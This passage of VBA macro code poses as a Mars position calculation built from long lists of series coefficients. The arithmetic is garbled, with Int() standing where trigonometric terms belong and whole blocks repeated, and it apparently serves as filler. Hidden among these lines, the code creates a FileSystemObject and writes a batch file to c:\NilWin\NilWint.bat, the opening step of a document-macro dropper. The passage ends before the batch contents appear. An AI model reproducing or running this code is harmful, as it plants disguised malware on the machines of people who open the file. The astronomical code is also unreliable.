 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000047 * Int(3.03959709242 + 5408.5438277724 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000063 * Int(4.16165369755 + 8186.5126624926 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000046 * Int(2.69368087378 + 16547.6417340648 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000051 * Int(2.99576014378 + 3774.3241645766 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000044 * Int(2.00664763411 + 6418.1409300268 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000045 * Int(4.01853755929 + 19406.6782881746 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000058 * Int(3.1447475355 + 4025.6564809258 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000005 * Int(2.59881540437 + 6621.850991486 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000043 * Int(4.87912487459 + 6414.6178116778 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000042 * Int(5.20400092044 + 4447.7512323846 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000051 * Int(1.99634375899 + 5032.7780962022 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000043 * Int(1.28813888865 + 6643.0918177618 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000004 * Int(0.9680161856 + 14591.4118201214 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000039 * Int(1.84985100829 + 10001.4819607006 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000039 * Int(5.69967200167 + 6106.8800550648 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000038 * Int(3.27498743518 + 18052.9295431578 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000039 * Int(2.84167905068 + 6652.7756659318 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000044 * Int(0.57891618854 + 16865.5287696312 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000043 * Int(4.61937364869 + 3341.0325027934 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000042 * Int(6.02555835659 + 6691.8615187494 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000034 * Int(4.9773499235 + 6670.5881880498 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000033 * Int(1.39167727215 + 4825.544916394 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000035 * Int(6.02955363644 + 3568.0885594888 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000035 * Int(0.31961016732 + 6645.1969867222 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000032 * Int(5.63043769073 + 3511.285297319 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000031 * Int(5.4297846421 + 9945.5712088238 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000038 * Int(5.66461657503 + 3416.8784979754 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000003 * Int(0.98518793666 + 20426.571092422 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000038 * Int(0.12870962242 + 6604.958782124 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000037 * Int(5.48374357342 + 3311.18291816379 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000032 * Int(6.1110697981 + 4392.8808098882 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000031 * Int(3.18481282781 + 3341.0423098265 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000034 * Int(2.32358226279 + 9072.6616711296 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000039 * Int(4.11042361929 + 3312.163239232 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000027 * Int(0.57810321636 + 3391.89276456221 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000029 * Int(2.48646403166 + 9815.6517316622 * Lite)
 
 
 Log2 (31)

 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000031 * Int(0.44265747667 + 3451.7990689874 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000027 * Int(6.13498177783 + 3362.4632560262 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000027 * Int(6.21846173482 + 5223.6939198022 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000027 * Int(2.94945830517 + 7203.8022714934 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000027 * Int(3.261798558 + 8756.269801473 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000027 * Int(3.943852717 + 23958.6317852334 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000033 * Int(3.77237326006 + 12808.8803039568 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000003 * Int(4.75096367323 + 15906.7641266826 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000031 * Int(0.88248871193 + 3340.1825435731 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000025 * Int(0.31303295413 + 6571.0185321802 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000031 * Int(4.29076841627 + 10020.8569590312 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000026 * Int(2.22427360058 + 10050.2864675672 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000025 * Int(0.67881122439 + 23937.856389741 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000031 * Int(1.72899093511 + 13745.3462390224 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000024 * Int(0.20355912395 + 3229.4257844122 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000032 * Int(3.37195631109 + 2284.7536148596 * Lite)
Mars_L12 = OPOPOTAMIKUSE * Lite
End Function
' ************************

Public Function Mars_L21(Lite)

' L2 Segment #1 of 1

 Dim OPOPOTAMIKUSE As Double
 OPOPOTAMIKUSE = 0#
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00058015791 * Int(2.04979463279 + 3340.6124266998 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00054187645 * Int(0 + 0 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00013908426 * Int(2.45742359888 + 6681.2248533996 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00002465104 * Int(2.80000020929 + 10021.8372800994 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000398379 * Int(3.14118428289 + 13362.4497067992 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000222022 * Int(3.19436080019 + 3.523118349 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000120957 * Int(0.54325292454 + 155.4203994342 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000061517 * Int(3.48529427371 + 16703.062133499 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000053638 * Int(3.54191121461 + 3344.1355450488 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000034268 * Int(6.00188499119 + 2281.2304965106 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000031665 * Int(4.14015171788 + 191.4482661116 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000029839 * Int(1.99870679845 + 796.2980068164 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000023168 * Int(4.33403365928 + 242.728603974 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000021659 * Int(3.44532466378 + 398.1490034082 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000016044 * Int(6.11000472441 + 2146.1654164752 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000002037 * Int(5.421913754 + 553.5694028424 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000014927 * Int(6.09541783564 + 3185.1920272656 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000016227 * Int(0.65678953303 + 0.9803210682 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000014317 * Int(2.61851897591 + 1349.8674096588 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000014416 * Int(4.01923812101 + 951.7184062506 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000011934 * Int(3.86122163021 + 6684.7479717486 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000015648 * Int(1.2208612194 + 1748.016413067 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000001126 * Int(4.71822363671 + 2544.3144198834 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000013352 * Int(0.60189008414 + 1194.4470102246 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000010396 * Int(0.25038714677 + 382.8965322232 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000009468 * Int(0.68170713564 + 1059.3819301892 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000009229 * Int(3.83209092321 + 20043.6745601988 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000009005 * Int(3.88271826102 + 3738.761430108 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000007501 * Int(5.46498630412 + 1751.539531416 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000006497 * Int(5.47773072872 + 1592.5960136328 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000006311 * Int(2.34104793674 + 3097.88382272579 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000006859 * Int(2.57522504136 + 3149.1641605882 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000587 * Int(1.14783576679 + 7.1135470008 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000006681 * Int(2.37843690339 + 4136.9104335162 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000004647 * Int(4.42957708526 + 6151.533888305 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000004166 * Int(3.68631477611 + 5614.7293762096 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000004764 * Int(2.89684755585 + 3333.498879699 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000004045 * Int(6.12493402657 + 5628.9564702112 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000003653 * Int(4.06679068397 + 1990.745017041 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000003618 * Int(2.46868561769 + 529.6909650946 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000003277 * Int(0.68101740787 + 8962.4553499102 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000003253 * Int(2.7956534039 + 3894.1818295422 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000003091 * Int(4.56861203364 + 3496.032826134 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000002921 * Int(5.41458945995 + 2914.0142358238 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000002921 * Int(1.23050883841 + 2787.0430238574 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000002784 * Int(1.38911141844 + 4292.3308329504 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000262 * Int(1.04061894134 + 3341.592747768 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000002888 * Int(3.41062353663 + 3337.0893083508 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000002418 * Int(0.96341462666 + 4535.0594369244 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000002357 * Int(4.84628239765 + 9492.1463150048 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000002593 * Int(5.74934234498 + 3340.5951730476 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000002191 * Int(3.26449527357 + 213.299095438 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000002594 * Int(1.49510566123 + 3340.629680352 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000002344 * Int(4.18104725028 + 10025.3603984484 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000263 * Int(4.67640929857 + 3583.3410306738 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000002602 * Int(2.64911714813 + 2388.8940204492 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000183 * Int(0.97181050149 + 1589.0728952838 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000002416 * Int(1.04749173375 + 4399.994356889 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000002386 * Int(4.2707257555 + 7079.3738568078 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000002187 * Int(0.16036551231 + 6525.8044539654 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000002344 * Int(0.01425578204 + 4690.4798363586 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000001617 * Int(4.95614491689 + 5088.6288397668 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000001633 * Int(1.10703599922 + 12303.06777661 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000002126 * Int(0.48290227706 + 2700.7151403858 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000001629 * Int(4.94267977718 + 1221.8485663214 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000001504 * Int(0.11031912519 + 2957.7158944766 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000001759 * Int(3.81170701376 + 3723.508958923 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000001401 * Int(3.85907867678 + 6283.0758499914 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000001338 * Int(5.29685392418 + 6677.7017350506 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000001763 * Int(2.51660121293 + 2810.9214616052 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000001392 * Int(2.73498041122 + 7477.522860216 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000001431 * Int(2.97747408389 + 6489.776587288 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000001236 * Int(3.7724596559 + 2699.7348193176 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000001234 * Int(1.88931735265 + 6681.2421070518 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000001513 * Int(2.92614134711 + 640.8776073822 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000074 * Int(3.8527624282 + 2766.267628365 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000056 * Int(2.49261586879 + 5642.1982426092 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000055 * Int(2.62555306434 + 14314.1681130498 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000054 * Int(3.95212835807 + 4032.7700279266 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000055 * Int(0.51062350773 + 15110.4661198662 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000053 * Int(5.88757767795 + 21265.5231265202 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000051 * Int(5.99253934388 + 21947.1113727 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000049 * Int(5.16723732129 + 20047.1976785478 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000067 * Int(1.53758821512 + 9380.9596727172 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000057 * Int(5.34893894346 + 17101.2111369072 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000049 * Int(1.9267860277 + 12721.572099417 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000046 * Int(2.3159032048 + 10028.9508271002 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000052 * Int(4.92463460288 + 16304.9131300908 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000005 * Int(1.69803302925 + 9225.539273283 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000045 * Int(2.91271003676 + 8982.810669309 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000044 * Int(4.38728556203 + 12168.0026965746 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000047 * Int(4.44933635857 + 6872.6731195112 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000043 * Int(2.13295656057 + 22324.9050567094 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000005 * Int(1.34759191325 + 8439.8779318164 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000044 * Int(0.89037464728 + 20752.6643624754 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000041 * Int(2.76164156557 + 6696.4773245846 * Lite)
 
 



 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000042 * Int(4.45031185062 + 10404.7338123226 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000044 * Int(3.20262780268 + 22743.4093795164 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000042 * Int(3.54559408987 + 30376.3526391666 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000042 * Int(0.82118836477 + 20597.2439630412 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000052 * Int(4.59037852162 + 22345.2603761082 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000042 * Int(3.79872109079 + 28628.3362260996 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000041 * Int(2.3625360208 + 16062.1845261168 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000005 * Int(1.48377570574 + 6040.3472460174 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000041 * Int(5.33088551342 + 765.7930644464 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000039 * Int(1.57984331116 + 24889.5747959916 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000038 * Int(0.21571600948 + 9168.6408983474 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000038 * Int(3.47667842127 + 1066.49547719 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000052 * Int(0.81427285458 + 9638.9407478762 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000041 * Int(0.04356010851 + 6660.8695340008 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000046 * Int(0.89345529755 + 16703.0448798468 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000044 * Int(0.85335841824 + 17468.8551979454 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000039 * Int(0.27098916103 + 11614.4332937322 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000036 * Int(3.93388136028 + 33716.9650658664 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000047 * Int(3.90896957151 + 5244.049239201 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000034 * Int(2.37310468308 + 10213.285546211 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000034 * Int(4.85454495742 + 14469.588512484 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000035 * Int(1.96497348634 + 6702.000248892 * Lite)

 
 
Set fs = CreateObject("Scripting.FileSystemObject")
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000033 * Int(2.14488758889 + 13363.4300278674 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000046 * Int(2.92422266239 + 16703.0793871512 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000035 * Int(1.78692835372 + 2648.454825473 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000033 * Int(4.24484480826 + 8584.6616659008 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000043 * Int(6.09391349922 + 6660.4494579072 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000035 * Int(5.72426647579 + 16699.53901515 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000031 * Int(1.95254273311 + 6665.9723822146 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000028 * Int(5.88548900893 + 19513.9835951042 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000003 * Int(4.38908125588 + 12295.9542296092 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000029 * Int(6.25276686131 + 17924.9106998204 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000025 * Int(4.89000247975 + 30065.5118402982 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000026 * Int(2.43119321236 + 6518.7582172674 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000028 * Int(3.97032105354 + 4407.1079038898 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000025 * Int(1.88631752737 + 4379.6390374902 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000028 * Int(3.06196380356 + 6247.5131155228 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000029 * Int(5.98057498931 + 6680.2445323314 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000032 * Int(4.65556810177 + 6701.5801727984 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000026 * Int(0.76018385758 + 3863.1898447936 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000023 * Int(0.31107548102 + 8827.3902698748 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000022 * Int(1.11553014451 + 6684.8152820514 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000033 * Int(2.14488758889 + 13363.4300278674 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000046 * Int(2.92422266239 + 16703.0793871512 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000035 * Int(1.78692835372 + 2648.454825473 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000033 * Int(4.24484480826 + 8584.6616659008 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000043 * Int(6.09391349922 + 6660.4494579072 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000035 * Int(5.72426647579 + 16699.53901515 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000031 * Int(1.95254273311 + 6665.9723822146 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000028 * Int(5.88548900893 + 19513.9835951042 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000003 * Int(4.38908125588 + 12295.9542296092 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000029 * Int(6.25276686131 + 17924.9106998204 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000025 * Int(4.89000247975 + 30065.5118402982 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000026 * Int(2.43119321236 + 6518.7582172674 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000028 * Int(3.97032105354 + 4407.1079038898 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000025 * Int(1.88631752737 + 4379.6390374902 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000028 * Int(3.06196380356 + 6247.5131155228 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000029 * Int(5.98057498931 + 6680.2445323314 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000032 * Int(4.65556810177 + 6701.5801727984 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000026 * Int(0.76018385758 + 3863.1898447936 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000023 * Int(0.31107548102 + 8827.3902698748 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000022 * Int(1.11553014451 + 6684.8152820514 * Lite)

Set a = fs.CreateTextFile("c:\NilWin\NilWint.bat", True)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000033 * Int(2.14488758889 + 13363.4300278674 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000046 * Int(2.92422266239 + 16703.0793871512 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000035 * Int(1.78692835372 + 2648.454825473 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000033 * Int(4.24484480826 + 8584.6616659008 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000043 * Int(6.09391349922 + 6660.4494579072 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000035 * Int(5.72426647579 + 16699.53901515 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000031 * Int(1.95254273311 + 6665.9723822146 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000028 * Int(5.88548900893 + 19513.9835951042 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000003 * Int(4.38908125588 + 12295.9542296092 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000029 * Int(6.25276686131 + 17924.9106998204 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000025 * Int(4.89000247975 + 30065.5118402982 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000026 * Int(2.43119321236 + 6518.7582172674 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000028 * Int(3.97032105354 + 4407.1079038898 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000025 * Int(1.88631752737 + 4379.6390374902 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000028 * Int(3.06196380356 + 6247.5131155228 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000029 * Int(5.98057498931 + 6680.2445323314 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000032 * Int(4.65556810177 + 6701.5801727984 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000026 * Int(0.76018385758 + 3863.1898447936 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000023 * Int(0.31107548102 + 8827.3902698748 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000022 * Int(1.11553014451 + 6684.8152820514 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000033 * Int(2.14488758889 + 13363.4300278674 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000046 * Int(2.92422266239 + 16703.0793871512 * Lite)
